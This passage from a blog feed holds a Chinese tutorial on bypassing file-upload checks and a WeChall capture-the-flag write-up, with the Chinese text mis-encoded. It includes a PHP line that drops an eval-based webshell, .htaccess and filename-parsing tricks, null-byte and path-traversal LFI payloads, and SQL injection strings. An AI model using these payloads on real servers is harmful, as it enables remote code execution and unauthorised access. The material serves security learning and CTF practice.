      <content type="html"><![CDATA[<p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œæœ‰æ—¶å€™å‡ ä¹æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯é—¨æ§›ã€‚<br><a id="more"></a></p>
<h1 id="0x01-ä¸Šä¼ æ£€æµ‹æœºåˆ¶"><a href="#0x01-ä¸Šä¼ æ£€æµ‹æœºåˆ¶" class="headerlink" title="0x01 ä¸Šä¼ æ£€æµ‹æœºåˆ¶"></a>0x01 ä¸Šä¼ æ£€æµ‹æœºåˆ¶</h1><h3 id="0x01-1-å®¢æˆ·ç«¯javascriptæ£€æµ‹"><a href="#0x01-1-å®¢æˆ·ç«¯javascriptæ£€æµ‹" class="headerlink" title="0x01_1 å®¢æˆ·ç«¯javascriptæ£€æµ‹"></a>0x01_1 å®¢æˆ·ç«¯javascriptæ£€æµ‹</h3><p>é€šå¸¸æ£€æµ‹çš„æ˜¯æ–‡ä»¶çš„æ‰©å±•å</p>
<h3 id="0x01-2-æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹"><a href="#0x01-2-æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹" class="headerlink" title="0x01_2 æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹"></a>0x01_2 æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹</h3><p>é€šå¸¸æ£€æµ‹çš„æ˜¯Content-Typeå†…å®¹</p>
<h3 id="0x01-3-æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹"><a href="#0x01-3-æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹" class="headerlink" title="0x01_3 æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹"></a>0x01_3 æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹</h3><p>é€šå¸¸è·Ÿpathå‚æ•°ç›¸å…³çš„å†…å®¹</p>
<h3 id="0x01-4-æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹"><a href="#0x01-4-æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹" class="headerlink" title="0x01_4 æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹"></a>0x01_4 æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹</h3><p>é€šå¸¸æ£€æµ‹è·Ÿæ–‡ä»¶extensionç›¸å…³çš„å†…å®¹</p>
<h3 id="0x01-5-æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹"><a href="#0x01-5-æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹" class="headerlink" title="0x01_5 æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹"></a>0x01_5 æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹</h3><p>æ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç </p>
<h1 id="0x02-æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨"><a href="#0x02-æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨"></a>0x02 æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨</h1><h3 id="0x02-1-javascriptå®¢æˆ·ç«¯éªŒè¯"><a href="#0x02-1-javascriptå®¢æˆ·ç«¯éªŒè¯" class="headerlink" title="0x02_1 javascriptå®¢æˆ·ç«¯éªŒè¯"></a>0x02_1 javascriptå®¢æˆ·ç«¯éªŒè¯</h3><p>åˆ›å»ºä¸€ä¸ªå…è®¸çš„æ–‡ä»¶ç±»å‹ï¼Œé‡Œé¢å†™å…¥æˆ‘ä»¬éœ€è¦çš„ä»£ç ï¼ŒæŠ“åŒ…ï¼Œæ‹¦æˆªï¼Œä¿®æ”¹ä¸ºå¯æ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚</p>
<h3 id="0x02-2-MIMEç±»å‹éªŒè¯"><a href="#0x02-2-MIMEç±»å‹éªŒè¯" class="headerlink" title="0x02_2 MIMEç±»å‹éªŒè¯"></a>0x02_2 MIMEç±»å‹éªŒè¯</h3><p>ç›´æ¥ä¿®æ”¹Content-Typeï¼šå…è®¸çš„MIMEç±»å‹</p>
<p>ä¿®æ”¹æ–‡ä»¶åä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæœ‰æ—¶å€™éœ€è¦é…åˆä¿®æ”¹<code>multipart/form-data</code>çš„å¤§å°å†™</p>
<p>å¸¸è§çš„MIMEç±»å‹ï¼š</p>
<pre><code>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/html ã€€ã€€
xmlæ–‡æ¡£ .xml text/xml
æ™®é€šæ–‡æœ¬ .txt text/plain ã€€ã€€
RTFæ–‡æœ¬ .rtf application/rtf ã€€ã€€
PDFæ–‡æ¡£ .pdf application/pdf ã€€ã€€
Microsoft Wordæ–‡ä»¶ .word application/msword ã€€ã€€
PNGå›¾åƒ .png image/png ã€€ã€€
GIFå›¾å½¢ .gif image/gif ã€€ã€€
JPEGå›¾å½¢ .jpeg,.jpg image/jpeg ã€€ã€€
auå£°éŸ³æ–‡ä»¶ .au audio/basic ã€€ã€€
MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi ã€€ã€€
RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio ã€€ã€€
MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg ã€€ã€€
AVIæ–‡ä»¶ .avi video/x-msvideo ã€€ã€€
GZIPæ–‡ä»¶ .gz application/x-gzip ã€€ã€€
TARæ–‡ä»¶ .tar application/x-tar ã€€ã€€
ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream
</code></pre><h3 id="0x02-3-ç›®å½•è·¯åˆ©ç”¨"><a href="#0x02-3-ç›®å½•è·¯åˆ©ç”¨" class="headerlink" title="0x02_3 ç›®å½•è·¯åˆ©ç”¨"></a>0x02_3 ç›®å½•è·¯åˆ©ç”¨</h3><p>è§£ææ˜¯ä»å‰å¾€åè§£æï¼Œåˆ¤æ–­æ˜¯ä»åå¾€å‰åˆ¤æ–­ã€‚</p>
<p>é›¶é›¶æˆªæ–­ä¸€èˆ¬æ­¥éª¤ä¸ºï¼š</p>
<pre><code>1.æ–°å»ºä¸€ä¸ªåä¸ºtest.php%00.jpgæˆ–è€…test.php.jpg

2.åœ¨é‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼ˆ[å¦‚ä½•åœ¨å›¾ç‰‡ä¸­æ’å…¥ä¸€å¥è¯](http://wenku.baidu.com/link?url=GoR21a2WWH2C8c8Q7HIgrz7CoW3B4suAwDaaRkAt6vgCZyYr7Le7Z9ZeiurBIE7NHuNwJ7dro5lCql8mRlk3y2IS7iFbWuQM99HV_kXDvTm)ï¼‰

3.burpæŠ“åŒ…æ”¹%00æˆ–è€….ä¸ºurlç¼–ç 
</code></pre><p>iisæŒ‰ç…§è·¯å¾„è§£æçš„æ˜¯ï¼š</p>
<p>æ¯”å¦‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåä¸º123.asp/123.jpgæ–‡ä»¶</p>
<p>åˆ™ï¼Œ123.asp/123.jpgä¼šè¢«ç›´æ¥è§£ææˆ123.asp</p>
<h3 id="0x02-4-æ–‡ä»¶æ‰©å±•ååˆ©ç”¨"><a href="#0x02-4-æ–‡ä»¶æ‰©å±•ååˆ©ç”¨" class="headerlink" title="0x02_4 æ–‡ä»¶æ‰©å±•ååˆ©ç”¨"></a>0x02_4 æ–‡ä»¶æ‰©å±•ååˆ©ç”¨</h3><h4 id="é»‘åå•æ£€æµ‹"><a href="#é»‘åå•æ£€æµ‹" class="headerlink" title="é»‘åå•æ£€æµ‹"></a>é»‘åå•æ£€æµ‹</h4><ul>
<li><p>æ–‡ä»¶å¤§å°å†™ç»•è¿‡</p>
<blockquote>
<p>æ¯”å¦‚åƒAspï¼ŒPhpä¹‹ç±»çš„æ–‡ä»¶åç»•è¿‡é»‘åå•æ£€æµ‹</p>
</blockquote>
</li>
<li><p>åå•åˆ—è¡¨ç»•è¿‡</p>
<blockquote>
<p>åˆ©ç”¨é»‘åå•é‡Œæ²¡æœ‰çš„åå•è¿›è¡Œæ”»å‡»ï¼Œæ¯”å¦‚é»‘åå•é‡Œæ²¡æœ‰asaï¼Œcerï¼Œphp3ï¼Œphp5ä¹‹ç±»çš„</p>
</blockquote>
</li>
<li><p>ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡</p>
<blockquote>
<p>ä¿®æ”¹æ–‡ä»¶åä¸ºtest.asp.æˆ–è€…test.asp_ï¼ˆä¸‹åˆ’çº¿ä¸ºç©ºæ ¼ï¼‰ï¼Œç»•è¿‡éªŒè¯ä¹‹åï¼Œwindowsä¼šè‡ªåŠ¨å»æ‰ç‚¹å’Œç©ºæ ¼ï¼Œlinuxå’Œunixä¸‹ä¸æ”¯æŒ</p>
</blockquote>
</li>
<li><p>0x00æˆªæ–­ç»•è¿‡</p>
</li>
<li><p>åŒæ‰©å±•åç»•è¿‡</p>
<blockquote>
<p>apacheè§£æå¼ä»åå¾€å‰ï¼Œæ‰€ä»¥å¦‚æœä¸Šä¼ ä¸€ä¸ªtest.php.123,ä¸è®¤è¯†.123çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šå¾€å‰è§£æï¼Œç›´åˆ°é‡åˆ°èƒ½è§£æçš„</p>
</blockquote>
</li>
<li><p>.htaccessæ–‡ä»¶æ”»å‡»</p>
<blockquote>
<p>é…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessæ–‡ä»¶ï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹</p>
</blockquote>
<p>  æ–°å»ºä¸€ä¸ª.htaccessæ–‡ä»¶<br>  ä»£ç ä¸ºï¼š<br>  <filesmatch "test"=""><br>  SetHandler application/x-httpd-php<br>  </filesmatch><br>  ç„¶åä¸Šä¼ ä¸€ä¸ªåŒ…å«testå­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œæ²¡æœ‰æ‰©å±•å<br>  é‡Œé¢å†™å…¥ä¸€å¥è¯å³å¯</p>
</li>
</ul>
<h4 id="ç™½åå•æ£€æµ‹"><a href="#ç™½åå•æ£€æµ‹" class="headerlink" title="ç™½åå•æ£€æµ‹"></a>ç™½åå•æ£€æµ‹</h4><ul>
<li><p>%00æˆªæ–­</p>
</li>
<li><p>è§£æè°ƒç”¨/æ¼æ´ç»•è¿‡</p>
<blockquote>
<p>é…åˆä¸Šä¼ ä¸€ä¸ªä»£ç æ³¨å…¥è¿‡çš„ç™½åå•æ–‡ä»¶å³å¯ï¼Œå†åˆ©ç”¨è§£æè°ƒç”¨/æ¼æ´</p>
</blockquote>
</li>
<li><p>.htaccessæ–‡ä»¶</p>
<h1 id="0x02-5-æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡"><a href="#0x02-5-æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡" class="headerlink" title="0x02_5 æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡"></a>0x02_5 æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡</h1></li>
<li><p>æ–‡ä»¶å¤´æ£€æµ‹</p>
<pre><code>jpg-JFIF-FF D8 FF EO 00 10 4A 46 49 46
gif-GIF89a-47 49 46 38 39 61
png-PNG-89 50 4E 47
åœ¨æ–‡ä»¶å¤´åé¢åŠ ä¸Šæ¶æ„ä»£ç å°±è¡Œäº†
</code></pre></li>
<li>æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹</li>
<li>æ–‡ä»¶åŠ è½½æ£€æµ‹<blockquote>
<p>åœ¨æ–‡ä»¶æ³¨é‡Šå¤„æ’å…¥æ¶æ„ä»£ç </p>
</blockquote>
</li>
</ul>
<h1 id="0x02-6-è§£ææ¼æ´åˆ©ç”¨"><a href="#0x02-6-è§£ææ¼æ´åˆ©ç”¨" class="headerlink" title="0x02_6 è§£ææ¼æ´åˆ©ç”¨"></a>0x02_6 è§£ææ¼æ´åˆ©ç”¨</h1><h4 id="Apacheçš„æ‰©å±•åé¡ºåºè§£ææ¼æ´"><a href="#Apacheçš„æ‰©å±•åé¡ºåºè§£ææ¼æ´" class="headerlink" title="Apacheçš„æ‰©å±•åé¡ºåºè§£ææ¼æ´"></a>Apacheçš„æ‰©å±•åé¡ºåºè§£ææ¼æ´</h4><p>å‘½åä¸ºtest.php.xxxï¼ˆé›†æˆç¯å¢ƒé‡Œphp3éƒ½ä¼šæŒ‰ç…§phpæ¥è§£æï¼‰</p>
<h4 id="IISçš„aspè§£ææ¼æ´"><a href="#IISçš„aspè§£ææ¼æ´" class="headerlink" title="IISçš„aspè§£ææ¼æ´"></a>IISçš„aspè§£ææ¼æ´</h4><ul>
<li><p>IIS6.0</p>
<pre><code>1.å‘½åä¸ºtest.asp;.jpg
2.å‘½åä¸ºtest.asp/123.jpg(test.aspæ˜¯ä¸€ä¸ªç›®å½•)
3.å‘½åä¸ºtest.asa,test.cer.test.cdx
</code></pre></li>
<li><p>IIS7.5/7.0</p>
<pre><code>åœ¨é»˜è®¤Fast-CGIå¼€å¯çŠ¶å†µä¸‹,ä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œå†…å®¹ä¸º
&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;
çš„æ–‡ä»¶ï¼Œç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬ shell.php
</code></pre><h4 id="Nginxçš„-00è§£ææ¼æ´"><a href="#Nginxçš„-00è§£ææ¼æ´" class="headerlink" title="Nginxçš„%00è§£ææ¼æ´"></a>Nginxçš„%00è§£ææ¼æ´</h4><p>  å‘½åä¸ºtest.jpg%00.php</p>
<h4 id="php-cgiçš„é»˜è®¤é…ç½®æ¼æ´"><a href="#php-cgiçš„é»˜è®¤é…ç½®æ¼æ´" class="headerlink" title="php-cgiçš„é»˜è®¤é…ç½®æ¼æ´"></a>php-cgiçš„é»˜è®¤é…ç½®æ¼æ´</h4></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WeChall writeup]]></title>
      <url>/2016/03/04/WeChall_writeup/</url>
      <content type="html"><![CDATA[<p>WeChall Challage writeup.</p>
<h1 id="Trainingï¼šGet-Sourced"><a href="#Trainingï¼šGet-Sourced" class="headerlink" title="Trainingï¼šGet Sourced"></a>Trainingï¼šGet Sourced</h1><a id="more"></a>
<p>æŸ¥çœ‹æºç </p>
<p>æœ€åé¢ï¼š<br>                                                                                                                                                                                                                                          <code>&lt;!-- You are looking for this password: html_sourcecode --&gt;</code></p>
<h1 id="Training-Stegano-I"><a href="#Training-Stegano-I" class="headerlink" title="Training: Stegano I"></a>Training: Stegano I</h1><p>éšå†™</p>
<p>ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨notepadæ‰“å¼€</p>
<blockquote>
<p>Look what the hex-edit revealed: passwd:steganoI</p>
</blockquote>
<h1 id="Training-ASCII"><a href="#Training-ASCII" class="headerlink" title="Training: ASCII"></a>Training: ASCII</h1><pre><code>84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 108, 101, 110, 112, 108, 99, 102, 104, 104, 105, 115, 102
</code></pre><p>ASCIIè§£ç </p>
<blockquote>
<p>The solution is: lenplcfhhisf</p>
</blockquote>
<h1 id="Training-Crypto-Caesar-I"><a href="#Training-Crypto-Caesar-I" class="headerlink" title="Training: Crypto - Caesar I"></a>Training: Crypto - Caesar I</h1><pre><code>VJG SWKEM DTQYP HQZ LWORU QXGT VJG NCBA FQI QH ECGUCT CPF AQWT WPKSWG UQNWVKQP KU DHFUHKPPTRCF
</code></pre><p>å‡¯æ’’è§£å¯†ï¼Œåç§»24</p>
<pre><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG OF CAESAR AND YOUR UNIQUE SOLUTION IS BFDSFINNRPAD
</code></pre><h1 id="Encodings-URL"><a href="#Encodings-URL" class="headerlink" title="Encodings: URL"></a>Encodings: URL</h1><pre><code>%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%6D%61%69%68%68%6D%6F%62%68%69%6E%70%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21 
</code></pre><p>URLç¼–ç ï¼ŒURLè§£ç </p>
<pre><code>Yippeh! Your URL is challenge/training/encodings/url/saw_lotion.php?p=maihhmobhinp&amp;cid=52#password=fibre_optics Very well done! 
</code></pre><h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training: WWW-Robots"></a>Training: WWW-Robots</h1><p>è€ƒå¯Ÿ<strong>robots.txt</strong>ï¼ˆç½‘ç»œçˆ¬è™«åè®®ï¼‰</p>
<pre><code>http://www.wechall.net/robots.txt
User-agent: *
Disallow: /challenge/training/www/robots/T0PS3CR3T
</code></pre><h1 id="Prime-Factory"><a href="#Prime-Factory" class="headerlink" title="Prime Factory"></a>Prime Factory</h1><p>æ‰¾åˆ°ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¤§äº1ç™¾ä¸‡ï¼Œå¹¶ä¸”æ¯ä¸ªä½ä¸Šçš„æ•°å­—çš„å’Œéƒ½æ˜¯ç´ æ•°çš„ç´ æ•°ã€‚</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>def iszhishu(n):
    for i in range(2,n):
        if n % i ==0:
            return False
    return True
def sum(n):
    count = 0
    for t in range(len(n)):
        count += int(n[t])
    if iszhishu(count):
        return True
    else:
        return False
for num in range(1000001,9999999):
    if iszhishu(num):
        if sum(str(num)):
            print(int(num))
</code></pre><p>å–å‰ä¸¤ä¸ª</p>
<blockquote>
<p>1000033 1000037</p>
</blockquote>
<h1 id="PHP-0817"><a href="#PHP-0817" class="headerlink" title="PHP 0817"></a>PHP 0817</h1><p>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
if (isset($_GET[&apos;which&apos;]))
{
        $which = $_GET[&apos;which&apos;];
        switch ($which)        
        {
        case 0:
        case 1:
        case 2:
                require_once $which.&apos;.php&apos;;                
                break;
        default:
                echo GWF_HTML::error(&apos;PHP-0817&apos;, &apos;Hacker NoNoNo!&apos;, false);
                break;
        }
}
</code></pre><p>è¦æ±‚æ˜¯åŒ…å«solution.php.</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/php0817/index.php?which=solution" target="_blank" rel="external">http://www.wechall.net/challenge/php0817/index.php?which=solution</a></p>
</blockquote>
<h1 id="Training-MySQL-I"><a href="#Training-MySQL-I" class="headerlink" title="Training: MySQL I"></a>Training: MySQL I</h1><p>ç®€å•çš„sqlæ³¨å…¥</p>
<p>ä¸‡èƒ½å¯†é’¥ï¼š</p>
<blockquote>
<p>adminâ€™orâ€™1â€™=â€™1</p>
</blockquote>
<h1 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h1><p>å°±æ˜¯ä¸€ä¸ªç®€å•çš„postæ•°æ®åŒ…ã€‚</p>
<p>å°±æ˜¯å…ˆè·å–ç”Ÿæˆéšæœºæ•°é‚£ä¸ªé¡µé¢çš„ http å¤´ã€‚ç„¶åæŠŠè‡ªå·±çš„ Cookie åŠ ä¸Šå»ã€‚</p>
<p>ç„¶åè¯·æ±‚è¿™ä¸ªé¡µé¢ï¼Œå¾—åˆ°å­—ç¬¦ä¸²ï¼Œå°†å…¶æ‹¼æ¥åœ¨æäº¤é¡µé¢çš„ url ä¸Šã€‚</p>
<p>å†è¯·æ±‚æäº¤é¡µé¢çš„ http å¤´ï¼Œå¹¶æ·»åŠ è‡ªå·±çš„ Cookieï¼Œæœ€åè¯·æ±‚å³å¯ã€‚</p>
<p>Warning:</p>
<p>è¿™ä¸ªç½‘ç«™åœ¨å›½å¤–ï¼Œä½†æ˜¯æ‰“å¼€ä¸€ä¸ªé¡µé¢å°±è¦ 1 ç§’å¤šã€‚æ‰€ä»¥å›½å†…è·‘è¿™ä¸ªè„šæœ¬è‚¯å®šè¶…æ—¶ã€‚è¿™æ—¶å€™ä½ å°±éœ€è¦ä¸€å°å›½å¤–æœåŠ¡å™¨æ¥è·‘è¿™ä¸ªè„šæœ¬ã€‚</p>
<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p><strong>æœ¬åœ°æ–‡ä»¶åŒ…å«+é›¶é›¶æˆªæ–­</strong>ã€‚</p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<pre><code>$filename = &apos;pages/&apos;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).&apos;.html&apos;;
include $filename;
</code></pre><p>ä¼šåœ¨fileçš„å‰é¢åŠ ä¸Š<code>pages/</code>åé¢åŠ ä¸Š<code>welcome</code></p>
<p>æ‰€ä»¥ç»“æœå°±æ˜¯ï¼š<code>pages/file.html</code></p>
<p>æ‰€ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00" target="_blank" rel="external">http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00</a></p>
</blockquote>
<h1 id="Training-Encodings-I"><a href="#Training-Encodings-I" class="headerlink" title="Training: Encodings I"></a>Training: Encodings I</h1><p>æœ¬æ¥æŒ‰ç…§æ­£å¸¸æ€è·¯æ˜¯å…ˆ8ä¸ª8ä¸ªä¸€ç»„ï¼Œåˆ†åˆ°æœ€åå‘ç°ä¸å¯¹ï¼Œä¸æ˜¯8çš„å€æ•°ã€‚ç„¶åç™¾åº¦ï¼ŒåŸæ¥é‡ç‚¹æ˜¯æç¤ºçš„ï¼š<code>English</code>ã€‚</p>
<p><strong>è‹±æ–‡å­—æ¯æ‰€ç”¨çš„asciiå­—ç¬¦åªå ç”¨ä¸ƒä¸ªbitï¼ˆå³7ä½ï¼‰</strong></p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>str1=&quot;101010011010001101001111001101000001110100110010111110001110100010000011010011110011010000001101110101101110001011010011110100010000011001011101110110001111011111100100110010111001000100000110000111100111100011110100111010010101110010000010110011101111111010111100100100000111000011000011110011111001111101111101111111001011001000100000110100111100110100000110010111000011110011111100111100111110100110000111100101110100110010111100100101110&quot;

print len(str1)

def res(str1):

    length = len(str1)

    for i in range(length/7):

        yield str1[i*7:(i+1)*7]
s=&quot;&quot;

for r in res(str1):

    s += chr(int(r,2)) //å°†äºŒè¿›åˆ¶çš„å­—ç¬¦ä¸²å˜æˆæ•´å½¢çš„åè¿›åˆ¶

print s
</code></pre><ul>
<li>yieldå…³é”®å­—ç”¨æ¥å®šä¹‰ç”Ÿæˆå™¨ï¼ˆGeneratorï¼‰ï¼Œå…¶å…·ä½“åŠŸèƒ½æ˜¯å¯ä»¥å½“returnä½¿ç”¨ï¼Œä»å‡½æ•°é‡Œè¿”å›ä¸€ä¸ªå€¼ï¼Œä¸åŒä¹‹å¤„æ˜¯ç”¨yieldè¿”å›ä¹‹åï¼Œå¯ä»¥è®©å‡½æ•°ä»ä¸Šå›yieldè¿”å›çš„åœ°ç‚¹ç»§ç»­æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œyieldè¿”å›å‡½æ•°ï¼Œäº¤ç»™è°ƒç”¨è€…ä¸€ä¸ªè¿”å›å€¼ï¼Œç„¶åå†â€œç¬ç§»â€å›å»ï¼Œè®©å‡½æ•°ç»§ç»­è¿è¡Œï¼Œ ç›´åˆ°å“ä¸€è·³yieldè¯­å¥å†è¿”å›ä¸€ä¸ªæ–°çš„å€¼ã€‚</li>
<li><code>int(r,2)</code>2æ˜¯è¡¨ç¤ºè½¬åŒ–ä¸ºåè¿›åˆ¶ï¼Œé»˜è®¤çš„æ˜¯0<blockquote>
<p>This text is 7-bit encoded ascii. Your password is easystarter.</p>
</blockquote>
</li>
</ul>
<h1 id="Training-Crypto-Transposition-I"><a href="#Training-Crypto-Transposition-I" class="headerlink" title="Training: Crypto - Transposition I"></a>Training: Crypto - Transposition I</h1><p><strong>ç½®æ¢å¯†ç </strong>ï¼šå°±æ˜¯æ˜æ–‡çš„å­—æ¯ä¿æŒç›¸åŒï¼Œä½†é¡ºåºè¢«æ‰“ä¹±äº†ã€‚</p>
<p>å¯†æ–‡å¦‚ä¸‹ï¼š</p>
<pre><code>oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wa nrrabflmag.b
</code></pre><p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>s=&apos;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wa msmniaocam.d&apos;
for i in range(0,len(s),2):
    res=&apos;&apos;
    t= (s[i + 1] + s[i])
    res +=t
    print res
</code></pre><p><strong>è¯´æ˜ï¼š</strong>å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º148ï¼Œæ‰€ä»¥å¯ä»¥æ¢çš„è¯å°±æœ‰ï¼š</p>
<ul>
<li>ä¸¤ä¸¤äº’æ¢å³oï¼ŒWäº’æ¢ï¼Œdï¼Œnäº’æ¢â€¦å…±74å¯¹</li>
<li>å››å››äº’æ¢å³oWdnï¼Œreufäº’æ¢ï¼Œ.lY ï¼Œuoc äº’æ¢â€¦å…±37å¯¹</li>
<li>37,37äº’æ¢â€¦</li>
<li>74,74äº’æ¢â€¦<blockquote>
<p>Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: asmnmaicomad.</p>
</blockquote>
</li>
</ul>
<h1 id="Training-Register-Globals"><a href="#Training-Register-Globals" class="headerlink" title="Training: Register Globals"></a>Training: Register Globals</h1><p>PHPå…¨å±€å˜é‡</p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<pre><code>...
if (isset($login))
{
    echo GWF_HTML::message(&apos;Register Globals&apos;, $chall-&gt;lang(&apos;msg_welcome_back&apos;, array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
    if (strtolower($login[0]) === &apos;admin&apos;) {
        $chall-&gt;onChallengeSolved(GWF_Session::getUserID());
    }
...
</code></pre><p>ä»£ç ä¸­æ£€æµ‹loginï¼Œå¦‚æœlogin[0]=â€™adminâ€™è¾“å‡ºä¿¡æ¯ã€‚</p>
<p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin" target="_blank" rel="external">http://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin</a></p>
</blockquote>
<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p><strong>updateæ³¨å…¥</strong></p>
<p>å¦‚æœä¸€ç›´ç‚¹ä¸€ä¸ªäººçš„è¯ï¼Œä¼šä¸€ç›´å¢é•¿ï¼Œå¦‚æœæœ‰äººè¾¾åˆ°100ï¼Œæ‰€æœ‰äººé‡ç½®ã€‚</p>
<p>æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/no_escape/index.php?vote_for=bil" target="_blank" rel="external">http://www.wechall.net/challenge/no_escape/index.php?vote_for=bil</a></p>
</blockquote>
<p>å›æ˜¾ä¸ºï¼š</p>
<blockquote>
<p>GDO Error(1054): Unknown column â€˜bilâ€™ in â€˜field listâ€™<br>UPDATE noescvotes SET <code>bil</code>=<code>bil</code>+1 WHERE id=1</p>
</blockquote>
<p>æ„é€ å¦‚ä¸‹è¯­å¥ï¼š</p>
<blockquote>
<p>bill`=111%23</p>
</blockquote>
<p>åˆ™sqlè¯­å¥ä¸ºï¼š</p>
<blockquote>
